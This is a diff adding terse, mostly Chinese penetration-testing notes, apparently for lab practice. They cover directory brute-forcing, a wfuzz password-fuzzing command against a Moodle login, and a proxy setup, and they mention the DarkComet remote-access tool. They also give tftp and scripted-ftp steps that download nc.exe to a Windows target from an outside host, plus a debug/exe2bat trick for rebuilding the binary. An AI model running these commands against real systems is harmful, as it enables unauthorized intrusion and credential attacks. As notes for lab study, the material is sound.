@@ -1,0 +1,60 @@
+tcpdump -i tun0 icmp -n
+
+binwalk 查看图片内容属性
+
+gobuster -u http:xxx.com -w /root/zidian.txt -t 100	目录爆破
+
+wfuzz -u http://10.10.10.153/moodle/login/index.php -d 'anchor=&username=Giovanni&password=Th4C00lTheachaFUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt 	模糊测试
+
+tmux 分屏
+
+
+代理：
+vi ~/bash.bashrc
+export ALL_PROXY=socks5://127.0.0.1:1080
+source ~/.bashrc
+
+dradis 共享
+keepnote 
+turecrypt 加密
+
+
+远控:darkcomet
+
+RegSnap(注册表监控软件)
+
+
+searchsploit mysql
+
+sniffpass(win)
+
+上传文件:
+curl
+wget
+nc
+
+WINDOWS:
+tftp -i 192.168.2.11 nc.exe
+
+ftp:
+echo open 192.168.2.11 21 >> 1.txt
+echo robot >> 1.txt
+echo passwd >> 1.txt
+echo bin >> 1.txt
+echo GET nc.exe >> 1.txt
+echo bye >> 1.txt
+ftp -s:1.txt
+
+debug:
+upx -9 nc.exe
+wine exe2bat.exe nc.exe nc.txt
+echo *** >> 123.hex
+debug<123.hex
+copy 123.hex nc.exe
+
+py转换exe:pyinstaller+pywin32
+python pyinstaller.py --onefile 	18176.py 
+
+WMIC(win)
+
+    镜像网站内容:httrack
